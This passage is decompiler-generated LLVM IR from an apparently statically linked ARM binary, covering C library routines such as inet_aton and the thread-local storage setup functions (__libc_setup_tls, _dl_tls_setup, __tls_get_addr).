  store i32 %v2_194c4, i32* @r1, align 4
  %v1_194cc = load i32, i32* @r4, align 4
  %v2_194cc = inttoptr i32 %v1_194cc to i32*
  store i32 %v3_194b4, i32* %v2_194cc, align 4
  %v0_194d0 = load i32, i32* @ip, align 4
  %v1_194d0 = trunc i32 %v0_194d0 to i8
  %v2_194d0 = load i32, i32* @r4, align 4
  %v3_194d0 = add i32 %v2_194d0, 16
  %v4_194d0 = inttoptr i32 %v3_194d0 to i8*
  store i8 %v1_194d0, i8* %v4_194d0, align 1
  %v0_194d4 = load i32, i32* @r4, align 4
  %v1_194d4 = add i32 %v0_194d4, 17
  store i32 %v1_194d4, i32* %r0.global-to-local, align 4
  %v4_194d8 = call i32 @__GI_mempcpy(i32 %v1_194d4, i32 %v2_194c4, i32 19, i32 %v3_194b4)
  store i32 %v4_194d8, i32* %r0.global-to-local, align 4
  %v0_194dc = load i32, i32* @r5, align 4
  store i32 %v0_194dc, i32* %r1.global-to-local, align 4
  %v3_194e4 = inttoptr i32 %v4_194d8 to i8*
  %v4_194e4 = call i32 @__GI_memset(i8* %v3_194e4, i32 %v0_194dc, i32 13)
  store i32 %v4_194e4, i32* %r0.global-to-local, align 4
  %v0_194e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_194e8

dec_label_pc_194e8:                               ; preds = %entry, %dec_label_pc_194a4
  %v0_194e8 = phi i32 [ %v3_19498, %entry ], [ %v0_194e8.pre, %dec_label_pc_194a4 ]
  store i32 %v0_194e8, i32* %r0.global-to-local, align 4
  store i32 %v3_19480, i32* @r4, align 4
  store i32 %v6_19480, i32* @r5, align 4
  store i32 %v9_19480, i32* @r6, align 4
  ret i32 %v0_194e8

; uselistorder directives
  uselistorder i32 %v0_194e8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 10, 1, 4, 13, 23, 11, 12, 5, 14, 6, 15, 7, 16, 17, 8, 18, 9, 2, 19, 3, 20, 21, 22, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 1, 0 }
  uselistorder label %dec_label_pc_194e8, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_194fc = load i32, i32* @r4, align 4
  store i32 %v3_194fc, i32* %stack_var_-28, align 4
  %v0_19504 = load i32, i32* @r0, align 4
  %v2_19504 = icmp eq i32 %v0_19504, 0
  %v0_1950c = load i32, i32* @r1, align 4
  br i1 %v2_19504, label %dec_label_pc_195e0, label %dec_label_pc_19514

dec_label_pc_19514:                               ; preds = %entry
  br label %dec_label_pc_1952c

dec_label_pc_1952c:                               ; preds = %dec_label_pc_19514, %dec_label_pc_195a4
  %v1_195a4 = phi i32 [ 0, %dec_label_pc_19514 ], [ %v5_195a4, %dec_label_pc_195a4 ]
  %v0_195a8 = phi i32 [ 1, %dec_label_pc_19514 ], [ %v1_195a8, %dec_label_pc_195a4 ]
  %v0_1952c = phi i32 [ %v0_19504, %dec_label_pc_19514 ], [ %v0_1952c13, %dec_label_pc_195a4 ]
  %v1_1952c = inttoptr i32 %v0_1952c to i8*
  %v2_1952c = load i8, i8* %v1_1952c, align 1
  %v3_1952c = zext i8 %v2_1952c to i32
  %v4_19530 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 276) to i32*), align 4
  %v2_19534 = mul nuw nsw i32 %v3_1952c, 2
  %v2_19538 = add i32 %v2_19534, %v4_19530
  %v3_19538 = inttoptr i32 %v2_19538 to i16*
  %v4_19538 = load i16, i16* %v3_19538, align 2
  %v1_1953c = and i16 %v4_19538, 8
  %v2_1953c = icmp eq i16 %v1_1953c, 0
  br i1 %v2_1953c, label %dec_label_pc_195e0, label %dec_label_pc_19544

dec_label_pc_19544:                               ; preds = %dec_label_pc_1952c
  br label %dec_label_pc_19564

dec_label_pc_1954c:                               ; preds = %dec_label_pc_19564
  %v2_1954c = mul i32 %v0_195a4, 10
  %v1_19550 = add i32 %v2_1954c, -48
  %v2_19554 = add i32 %v3_19564, %v1_19550
  %v8_1955c = icmp sgt i32 %v2_19554, 255
  br i1 %v8_1955c, label %dec_label_pc_195e0, label %dec_label_pc_19560

dec_label_pc_19560:                               ; preds = %dec_label_pc_1954c
  %v1_19560 = add i32 %v0_19594, 1
  store i32 %v1_19560, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19564

dec_label_pc_19564:                               ; preds = %dec_label_pc_19544, %dec_label_pc_19560
  %v0_195a4 = phi i32 [ 0, %dec_label_pc_19544 ], [ %v2_19554, %dec_label_pc_19560 ]
  %v0_19594 = phi i32 [ %v0_1952c, %dec_label_pc_19544 ], [ %v1_19560, %dec_label_pc_19560 ]
  %v1_19564 = inttoptr i32 %v0_19594 to i8*
  %v2_19564 = load i8, i8* %v1_19564, align 1
  %v3_19564 = zext i8 %v2_19564 to i32
  %v2_19568 = mul nuw nsw i32 %v3_19564, 2
  %v2_1956c = add i32 %v2_19568, %v4_19530
  %v3_1956c = inttoptr i32 %v2_1956c to i16*
  %v4_1956c = load i16, i16* %v3_1956c, align 2
  %v6_1956c = zext i16 %v4_1956c to i32
  %v1_19570 = and i32 %v6_1956c, 8
  %v2_19570 = icmp eq i32 %v1_19570, 0
  br i1 %v2_19570, label %dec_label_pc_19578, label %dec_label_pc_1954c

dec_label_pc_19578:                               ; preds = %dec_label_pc_19564
  %v7_19578 = icmp eq i32 %v0_195a8, 4
  br i1 %v7_19578, label %dec_label_pc_19590, label %dec_label_pc_19580

dec_label_pc_19580:                               ; preds = %dec_label_pc_19578
  %v7_19580 = icmp eq i8 %v2_19564, 46
  br i1 %v7_19580, label %dec_label_pc_19588, label %dec_label_pc_195e0

dec_label_pc_19588:                               ; preds = %dec_label_pc_19580
  %v1_19588 = add i32 %v0_19594, 1
  store i32 %v1_19588, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195a4

dec_label_pc_19590:                               ; preds = %dec_label_pc_19578
  %v2_19590 = icmp eq i8 %v2_19564, 0
  %v1_19594 = add i32 %v0_19594, 1
  store i32 %v1_19594, i32* %r0.global-to-local, align 4
  br i1 %v2_19590, label %dec_label_pc_195a4, label %dec_label_pc_1959c

dec_label_pc_1959c:                               ; preds = %dec_label_pc_19590
  %v1_1959c = and i32 %v6_1956c, 32
  %v2_1959c = icmp eq i32 %v1_1959c, 0
  br i1 %v2_1959c, label %dec_label_pc_195e0, label %dec_label_pc_195a4

dec_label_pc_195a4:                               ; preds = %dec_label_pc_1959c, %dec_label_pc_19590, %dec_label_pc_19588
  %v0_1952c13 = phi i32 [ %v1_19594, %dec_label_pc_1959c ], [ %v1_19594, %dec_label_pc_19590 ], [ %v1_19588, %dec_label_pc_19588 ]
  %v4_195a4 = mul i32 %v1_195a4, 256
  %v5_195a4 = or i32 %v0_195a4, %v4_195a4
  %v1_195a8 = add nuw nsw i32 %v0_195a8, 1
  %v7_195b0 = icmp slt i32 %v1_195a8, 5
  br i1 %v7_195b0, label %dec_label_pc_1952c, label %dec_label_pc_195b4

dec_label_pc_195b4:                               ; preds = %dec_label_pc_195a4
  %v2_195b4 = icmp eq i32 %v0_1950c, 0
  br i1 %v2_195b4, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_195b4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195e4

bb:                                               ; preds = %dec_label_pc_195b4
  %v4_195b8 = udiv i32 %v5_195a4, 16777216
  %v2_195bc = udiv i32 %v5_195a4, 256
  %v5_195c0 = and i32 %v2_195bc, 65280
  %v2_195c4 = and i32 %v5_195a4, 65280
  %v5_195c8 = mul nuw nsw i32 %v2_195c4, 256
  %v5_195cc = mul i32 %v0_195a4, 16777216
  %v6_195c0 = or i32 %v4_195b8, %v5_195cc
  %v6_195c8 = or i32 %v6_195c0, %v5_195c0
  %v6_195cc = or i32 %v6_195c8, %v5_195c8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_195d8 = inttoptr i32 %v0_1950c to i32*
  store i32 %v6_195cc, i32* %v3_195d8, align 4
  %v2_195e4.pre = load i32, i32* %stack_var_-28, align 4
  %v1_195e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195e4

dec_label_pc_195e0:                               ; preds = %dec_label_pc_19580, %dec_label_pc_1959c, %dec_label_pc_1952c, %dec_label_pc_1954c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_195e4

dec_label_pc_195e4:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_195e0
  %v1_195e8 = phi i32 [ %v1_195e8.pre, %bb ], [ 0, %dec_label_pc_195e0 ], [ 1, %.thread8.thread ]
  %v2_195e4 = phi i32 [ %v2_195e4.pre, %bb ], [ %v3_194fc, %dec_label_pc_195e0 ], [ %v3_194fc, %.thread8.thread ]
  store i32 %v2_195e4, i32* @r4, align 4
  ret i32 %v1_195e8

; uselistorder directives
  uselistorder i32 %v1_195a8, { 1, 0 }
  uselistorder i32 %v5_195a4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_19594, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 65280, { 62, 1, 63, 2, 7, 0, 3, 4, 8, 9, 10, 11, 12, 46, 47, 13, 14, 15, 48, 49, 16, 17, 18, 19, 20, 50, 5, 51, 52, 21, 22, 6, 23, 53, 54, 41, 24, 25, 26, 27, 28, 44, 45, 42, 43, 55, 56, 57, 58, 29, 30, 59, 31, 32, 33, 34, 60, 35, 36, 61, 37, 38, 39, 40, 64, 65, 66 }
  uselistorder i8 46, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 18, 19, 21, 7, 22, 8, 23, 3, 4, 11, 24, 12, 25, 9, 26, 10, 27, 15, 28, 16, 29, 13, 30, 14, 31, 20, 17, 32 }
  uselistorder i16 0, { 0, 1, 2, 8, 9, 3, 4, 10, 11, 13, 12, 5, 14, 15, 16, 17, 18, 19, 20, 21, 22, 6, 23, 7, 24, 25, 26 }
  uselistorder i32 276, { 1, 0, 2 }
  uselistorder label %dec_label_pc_195e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_195e0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_19564, { 1, 0 }
  uselistorder label %dec_label_pc_1952c, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_19600 = load i32, i32* @r4, align 4
  store i32 %v3_19600, i32* %stack_var_-16, align 4
  %v4_19604 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1960c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_19614 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 36) to i32*), align 4
  store i32 %v4_19614, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_1961c = inttoptr i32 %v4_19604 to i32*
  %v2_1961c = load i32, i32* %v1_1961c, align 4
  %v4_19620 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 52) to i32*), align 4
  store i32 %v4_19620, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_19628 = add i32 %v2_1961c, 15
  %v4_1962c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 144) to i32*), align 4
  store i32 %v4_1962c, i32* @ip, align 4
  %v1_19630 = load i32, i32* @r0, align 4
  %v2_19630 = add i32 %v1_19630, %v1_19628
  %v1_19634 = inttoptr i32 %v4_1960c to i32*
  %v2_19634 = load i32, i32* %v1_19634, align 4
  store i32 %v2_19634, i32* %r3.global-to-local, align 4
  %v1_19638 = and i32 %v2_19630, -16
  store i32 %v1_19638, i32* %v1_1961c, align 4
  %v0_19640 = load i32, i32* @r0, align 4
  %v1_19640 = load i32, i32* %r4.global-to-local, align 4
  %v2_19640 = inttoptr i32 %v1_19640 to i32*
  store i32 %v0_19640, i32* %v2_19640, align 4
  %v0_19644 = load i32, i32* @r1, align 4
  %v1_19644 = load i32, i32* %lr.global-to-local, align 4
  %v2_19644 = inttoptr i32 %v1_19644 to i32*
  store i32 %v0_19644, i32* %v2_19644, align 4
  %v0_19648 = load i32, i32* %r3.global-to-local, align 4
  %v1_19648 = load i32, i32* @ip, align 4
  %v2_19648 = inttoptr i32 %v1_19648 to i32*
  store i32 %v0_19648, i32* %v2_19648, align 4
  %v2_1964c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1964c, i32* %r4.global-to-local, align 4
  %v1_19650 = load i32, i32* @r0, align 4
  ret i32 %v1_19650

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_19658(i32 %arg1) local_unnamed_addr {
dec_label_pc_19658:
  %v0_19658 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19658, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19658
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19658, %bb
  %v4_19668 = phi i32 [ %arg1, %dec_label_pc_19658 ], [ 0, %bb ]
  ret i32 %v4_19668

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r3.global-to-local, align 4
  %v4_1967c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 84) to i32*), align 4
  store i32 %v4_1967c, i32* @lr, align 4
  %v4_19688 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 10776) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 10776), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_196a8 = inttoptr i32 %v4_19688 to i32*
  store i32 1, i32* %v2_196a8, align 4
  %v0_196ac = load i32, i32* %r3.global-to-local, align 4
  %v1_196ac = load i32, i32* @lr, align 4
  %v2_196ac = inttoptr i32 %v1_196ac to i32*
  store i32 %v0_196ac, i32* %v2_196ac, align 4
  %v0_196b0 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_196c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_196c8:
  %v0_196c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_196c8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_196c8
  %v2_196c8 = load i32, i32* @r4, align 4
  %v8_196c8 = ashr i32 %v2_196c8, %arg1
  %v9_196c8 = and i32 %v8_196c8, %arg1
  %v2_196cc = load i32, i32* @ip, align 4
  %v8_196cc = lshr i32 %v2_196cc, %v9_196c8
  %v9_196cc = and i32 %v8_196cc, %v9_196c8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_196c8, %bb
  %v10_196d0 = phi i32 [ %arg1, %dec_label_pc_196c8 ], [ %v9_196cc, %bb ]
  ret i32 %v10_196d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_196dc = call i32 @__aeabi_read_tp()
  %v1_196e0 = inttoptr i32 %v0_196dc to i32*
  %v2_196e0 = load i32, i32* %v1_196e0, align 4
  %v1_196e4 = add i32 %arg1, 4
  %v2_196e4 = inttoptr i32 %v1_196e4 to i32*
  %v3_196e4 = load i32, i32* %v2_196e4, align 4
  %v1_196e8 = add i32 %v2_196e0, 8
  %v2_196e8 = inttoptr i32 %v1_196e8 to i32*
  %v3_196e8 = load i32, i32* %v2_196e8, align 4
  %v2_196ec = add i32 %v3_196e8, %v3_196e4
  ret i32 %v2_196ec
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_196f8 = load i32, i32* @r4, align 4
  store i32 %v3_196f8, i32* %stack_var_-36, align 4
  %v6_196f8 = load i32, i32* @r5, align 4
  %v15_196f8 = load i32, i32* @r8, align 4
  %v18_196f8 = load i32, i32* @sb, align 4
  %v21_196f8 = load i32, i32* @sl, align 4
  %v24_196f8 = load i32, i32* @fp, align 4
  %v27_196f8 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %sl.global-to-local, align 4
  %v4_19708 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 104) to i32*), align 4
  store i32 %v4_19708, i32* %r3.global-to-local, align 4
  %v1_1970c = inttoptr i32 %v4_19708 to i32*
  %v2_1970c = load i32, i32* %v1_1970c, align 4
  store i32 %v2_1970c, i32* %r2.global-to-local, align 4
  %v2_19710 = icmp eq i32 %v2_1970c, 0
  %v0_19718 = load i32, i32* %r0.global-to-local, align 4
  %v0_1971c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1971c, i32* %ip.global-to-local, align 4
  br i1 %v2_19710, label %dec_label_pc_198e4, label %dec_label_pc_19724

dec_label_pc_19724:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_19728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 156) to i32*), align 4
  store i32 %v4_19728, i32* @lr, align 4
  store i32 %v2_1970c, i32* %r1.global-to-local, align 4
  %v1_19770 = inttoptr i32 %v4_19728 to i32*
  %v2_1977061 = load i32, i32* %v1_19770, align 4
  %v4_1977462 = mul i32 %v2_1977061, 32
  %v5_1977463 = add i32 %v4_1977462, %v2_1970c
  store i32 %v5_1977463, i32* %r3.global-to-local, align 4
  %v3_1977865 = icmp ult i32 %v2_1970c, %v5_1977463
  br i1 %v3_1977865, label %dec_label_pc_19734, label %dec_label_pc_198e4.loopexit

dec_label_pc_19734:                               ; preds = %dec_label_pc_19724, %dec_label_pc_1976c
  %v0_1974c66 = phi i32 [ %v1_1976c, %dec_label_pc_1976c ], [ %v2_1970c, %dec_label_pc_19724 ]
  %v1_19734 = inttoptr i32 %v0_1974c66 to i32*
  %v2_19734 = load i32, i32* %v1_19734, align 4
  store i32 %v2_19734, i32* %r3.global-to-local, align 4
  %v7_19738 = icmp eq i32 %v2_19734, 7
  br i1 %v7_19738, label %dec_label_pc_19740, label %dec_label_pc_1976c

dec_label_pc_19740:                               ; preds = %dec_label_pc_19734
  %v1_19740 = add i32 %v0_1974c66, 20
  %v2_19740 = inttoptr i32 %v1_19740 to i32*
  %v3_19740 = load i32, i32* %v2_19740, align 4
  store i32 %v3_19740, i32* %r3.global-to-local, align 4
  %v1_19744 = add i32 %v0_1974c66, 28
  %v2_19744 = inttoptr i32 %v1_19744 to i32*
  %v3_19744 = load i32, i32* %v2_19744, align 4
  store i32 %v3_19744, i32* @r6, align 4
  %v1_1974c = add i32 %v0_1974c66, 16
  %v2_1974c = inttoptr i32 %v1_1974c to i32*
  %v3_1974c = load i32, i32* %v2_1974c, align 4
  store i32 %v3_1974c, i32* %r3.global-to-local, align 4
  %v1_19750 = add i32 %v0_1974c66, 8
  %v2_19750 = inttoptr i32 %v1_19750 to i32*
  %v3_19750 = load i32, i32* %v2_19750, align 4
  store i32 %v3_19750, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_19744, %v0_1971c
  %v0_1971c.v3_19744 = select i1 %tmp78, i32 %v0_1971c, i32 %v3_19744
  store i32 %v0_1971c.v3_19744, i32* %fp.global-to-local, align 4
  %v2_19788 = icmp eq i32 %v3_19744, 0
  br i1 %v2_19788, label %dec_label_pc_197b0, label %bb

dec_label_pc_1976c:                               ; preds = %dec_label_pc_19734
  %v1_1976c = add i32 %v0_1974c66, 32
  store i32 %v1_1976c, i32* %r1.global-to-local, align 4
  %v2_19770 = load i32, i32* %v1_19770, align 4
  %v4_19774 = mul i32 %v2_19770, 32
  %v5_19774 = add i32 %v4_19774, %v2_1970c
  store i32 %v5_19774, i32* %r3.global-to-local, align 4
  %v3_19778 = icmp ult i32 %v1_1976c, %v5_19774
  br i1 %v3_19778, label %dec_label_pc_19734, label %dec_label_pc_19770.dec_label_pc_198e4.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_19740
  %v2_1978c = add i32 %v3_19744, -1
  br label %dec_label_pc_197b4

dec_label_pc_197b0:                               ; preds = %dec_label_pc_19740, %dec_label_pc_198e4
  %v0_197c4.pre = phi i32 [ %v0_197c4.pre.pre, %dec_label_pc_198e4 ], [ ptrtoint (i32* @global_var_240f8.537 to i32), %dec_label_pc_19740 ]
  %v1_197b4.pre = phi i32 [ %v1_197b4.pre.pre, %dec_label_pc_198e4 ], [ %v0_19718, %dec_label_pc_19740 ]
  %v1_197d825 = phi i32 [ %v0_198ec, %dec_label_pc_198e4 ], [ %v0_1971c.v3_19744, %dec_label_pc_19740 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_198e4 ], [ %v3_19740, %dec_label_pc_19740 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_198e4 ], [ %v3_1974c, %dec_label_pc_19740 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_198e4 ], [ %v3_19750, %dec_label_pc_19740 ]
  br label %dec_label_pc_197b4

dec_label_pc_197b4:                               ; preds = %bb, %dec_label_pc_197b0
  %storemerge80 = phi i32 [ %v2_1978c, %bb ], [ 0, %dec_label_pc_197b0 ]
  %v0_197b4 = phi i32 [ %v2_1978c, %bb ], [ 0, %dec_label_pc_197b0 ]
  %storemerge = phi i32 [ %v3_19744, %bb ], [ 1, %dec_label_pc_197b0 ]
  %storemerge79 = phi i32 [ %v3_19744, %bb ], [ 1, %dec_label_pc_197b0 ]
  %v0_197c4 = phi i32 [ ptrtoint (i32* @global_var_240f8.537 to i32), %bb ], [ %v0_197c4.pre, %dec_label_pc_197b0 ]
  %v1_197b4 = phi i32 [ %v0_19718, %bb ], [ %v1_197b4.pre, %dec_label_pc_197b0 ]
  %v1_197d8 = phi i32 [ %v0_1971c.v3_19744, %bb ], [ %v1_197d825, %dec_label_pc_197b0 ]
  %stack_var_-52.3 = phi i32 [ %v3_19740, %bb ], [ %stack_var_-52.0, %dec_label_pc_197b0 ]
  %stack_var_-48.3 = phi i32 [ %v3_1974c, %bb ], [ %stack_var_-48.0, %dec_label_pc_197b0 ]
  %stack_var_-44.3 = phi i32 [ %v3_19750, %bb ], [ %stack_var_-44.0, %dec_label_pc_197b0 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_197b4 = add i32 %v1_197b4, %v0_197b4
  %v2_197b8 = udiv i32 %v2_197b4, %storemerge
  store i32 %v2_197b8, i32* %r0.global-to-local, align 4
  %v2_197bc = mul i32 %v2_197b8, %storemerge
  store i32 %v2_197bc, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_197c4 = add i32 %v0_197c4, 72
  %v3_197c4 = inttoptr i32 %v2_197c4 to i32*
  %v4_197c4 = load i32, i32* %v3_197c4, align 4
  store i32 %v4_197c4, i32* %r3.global-to-local, align 4
  %v1_197c8 = inttoptr i32 %v4_197c4 to i32*
  %v2_197c8 = load i32, i32* %v1_197c8, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_197d0 = add i32 %v1_197d8, 1168
  %v2_197d4 = add i32 %v1_197d0, %stack_var_-52.3
  %v2_197d8 = add i32 %v2_197d4, %v2_197bc
  %v2_197dc = add i32 %v2_197d8, %v2_197c8
  store i32 %v2_197dc, i32* %r0.global-to-local, align 4
  %v1_197e0 = call i32 @__GI_sbrk(i32 %v2_197dc)
  %v1_197e4 = load i32, i32* %fp.global-to-local, align 4
  %v1_197ec = sub i32 0, %v1_197e4
  store i32 10264, i32* %r4.global-to-local, align 4
  %v2_197e4 = add i32 %v1_197e0, 1167
  %v1_197f4 = add i32 %v2_197e4, %v1_197e4
  %v2_197f8 = and i32 %v1_197f4, %v1_197ec
  store i32 %v2_197f8, i32* @r5, align 4
  %v1_19800 = load i32, i32* %sl.global-to-local, align 4
  %v3_19800 = add i32 %v1_19800, 10264
  %v4_19800 = inttoptr i32 %v3_19800 to i32*
  store i32 62, i32* %v4_19800, align 4
  %v0_19808 = load i32, i32* @r5, align 4
  %v1_19808 = load i32, i32* %sb.global-to-local, align 4
  %v2_19808 = add i32 %v1_19808, %v0_19808
  store i32 %v2_19808, i32* @ip, align 4
  %v0_1980c = load i32, i32* %sl.global-to-local, align 4
  %v1_1980c = load i32, i32* %r4.global-to-local, align 4
  %v2_1980c = add i32 %v1_1980c, %v0_1980c
  store i32 %v2_1980c, i32* %r4.global-to-local, align 4
  %v2_19810 = add i32 %v0_1980c, 11552
  store i32 %v2_19810, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_19808, i32* @r0, align 4
  %v2_19824 = add i32 %v2_1980c, 16
  %v3_19824 = inttoptr i32 %v2_19824 to i32*
  store i32 %v2_19808, i32* %v3_19824, align 4
  %v0_19828 = load i32, i32* %sb.global-to-local, align 4
  %v1_19828 = load i32, i32* %r8.global-to-local, align 4
  %v2_19828 = add i32 %v1_19828, 40
  %v3_19828 = inttoptr i32 %v2_19828 to i32*
  store i32 %v0_19828, i32* %v3_19828, align 4
  %v0_1982c = load i32, i32* @r3, align 4
  %v1_1982c = trunc i32 %v0_1982c to i8
  %v2_1982c = load i32, i32* %r4.global-to-local, align 4
  %v3_1982c = add i32 %v2_1982c, 20
  %v4_1982c = inttoptr i32 %v3_1982c to i8*
  store i8 %v1_1982c, i8* %v4_1982c, align 1
  %v0_19830 = load i32, i32* %r4.global-to-local, align 4
  %v1_19830 = add i32 %v0_19830, 8
  store i32 %v1_19830, i32* @r4, align 4
  %v0_19834 = call i32 @memcpy()
  %v0_1983c = load i32, i32* @r4, align 4
  %v1_1983c = load i32, i32* @r5, align 4
  %v2_1983c = inttoptr i32 %v1_1983c to i32*
  store i32 %v0_1983c, i32* %v2_1983c, align 4
  %v0_19840 = load i32, i32* @r5, align 4
  store i32 %v0_19840, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_19840, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_15134.740 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_19854 = load i32, i32* %sl.global-to-local, align 4
  %v2_19854 = add i32 %v0_19854, 84
  %v3_19854 = inttoptr i32 %v2_19854 to i32*
  %v4_19854 = load i32, i32* %v3_19854, align 4
  store i32 %v4_19854, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10776, i32* %r1.global-to-local, align 4
  %v2_19860 = add i32 %v0_19854, 60
  %v3_19860 = inttoptr i32 %v2_19860 to i32*
  %v4_19860 = load i32, i32* %v3_19860, align 4
  store i32 %v4_19860, i32* %r0.global-to-local, align 4
  %v3_19868 = add i32 %v0_19854, 10776
  %v4_19868 = inttoptr i32 %v3_19868 to i32*
  store i32 64, i32* %v4_19868, align 4
  %v1_19870 = load i32, i32* %r8.global-to-local, align 4
  %v2_19870 = add i32 %v1_19870, 20
  %v3_19870 = inttoptr i32 %v2_19870 to i32*
  store i32 %stack_var_-44.3, i32* %v3_19870, align 4
  %v1_19878 = load i32, i32* %r8.global-to-local, align 4
  %v2_19878 = add i32 %v1_19878, 24
  %v3_19878 = inttoptr i32 %v2_19878 to i32*
  store i32 %stack_var_-48.3, i32* %v3_19878, align 4
  %v1_19880 = load i32, i32* %r0.global-to-local, align 4
  %v2_19880 = inttoptr i32 %v1_19880 to i32*
  store i32 1, i32* %v2_19880, align 4
  %v1_19888 = load i32, i32* %r8.global-to-local, align 4
  %v2_19888 = add i32 %v1_19888, 28
  %v3_19888 = inttoptr i32 %v2_19888 to i32*
  store i32 %stack_var_-52.3, i32* %v3_19888, align 4
  %v0_19890 = load i32, i32* @r6, align 4
